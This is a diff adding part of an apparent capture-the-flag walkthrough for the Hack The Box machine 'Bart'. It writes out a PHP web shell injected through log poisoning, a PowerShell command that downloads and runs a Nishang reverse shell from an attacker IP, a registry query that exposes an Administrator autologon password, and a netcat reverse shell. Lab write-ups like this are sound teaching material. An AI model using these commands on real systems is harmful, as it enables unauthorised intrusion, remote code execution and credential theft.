@@ -184,7 +184,81 @@ Edit User-Aget line like this `User-Agent: <?php system($_REQUEST['Argument']); 
 
 ![burp](/assets/bart/burp4-10.10.10.81.png)
 
+After that we can  change back  User agent to anything and modify first line of request like this
 
+`GET /log/log.php?filename=log.php&username=harvey&Argument=whoami HTTP/1.1`
 
+![burp](/assets/bart/burp5-10.10.10.81.png)
+
+We can see that `whoami` command got executed and we got user `nt authority\iusr`
+
+So now we can create a reverse shell proxy it through Burp Suite and send request to repearter
+
+But let's first prepare our shell
+git clone https://github.com/samratashok/nishang
+
+Copy `Invoke-PowershellTcp.ps1` from `nishang/Scripts/` to our bart folder and rename it to `rev.ps1`
+
+Add line in the end of the file
+
+![shell](/assets/bart/shell-10.10.10.81.png)
+
+serve this shell file locally via python http server
+
+`python -m SimpleHTTPServer 80`
+
+Return to Burp and change first line like this and encode it with CTRL+U
+
+`GET /log/log.php?filename=log.php&username=harvey&Argument=Powershell "IEX(New-Object Net.Webclient).downloadString('http://10.10.14.35/rev.ps1')" HTTP/1.1`
+
+![burp](/assets/bart/burp6-10.10.10.81.png)
+
+start listener 
+
+`nc -nvlp 3333`
+
+and we got shell
+
+![reverse](/assets/bart/rev1-10.10.10.81.png)
+
+whoami
+
+![reverse](/assets/bart/whoami-10.10.10.81.png)
+
+We have SeImpersonatePrivilege and this means we can probably use RotenPotato. But let's dig more.
+
+We can look for Autologon in registry
+
+`%SystemRoot%\Sysnative\reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`
+
+![winlogon](/assets/bart/autologin-10.10.10.81.png)
+
+we found password for Administrator `3130438f31186fbaf962f407711faddb`
+
+In windows we can't simple swith to another user so we need to do runas workaround here.
+
+{% highlight powershell %}
+powershell.exe
+$username = 'BART\Administrator'
+$securePassword = ConvertTo-SecureString -AsPlainText -Force '3130438f31186fbaf962f407711faddb'
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+Enter-PSSession -ComputerName localhost -Credential $credential
+{% endhighlight %}
+
+![runas](/assets/bart/runas-10.10.10.81.png)
+
+Okay, let's upload nc.exe (netcat)
+
+`Invoke-WebRequest -o nc.exe http://10.10.14.35/nc.exe`
+
+Craete new reverse shell with netcat
+
+`cmd.exe /c "C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.35 5555 -e cmd.exe"`
+
+![runas](/assets/bart/nc2-10.10.10.81.png)
+
+and we got root
+
+![root](/assets/bart/root-10.10.10.81.png)
 
 
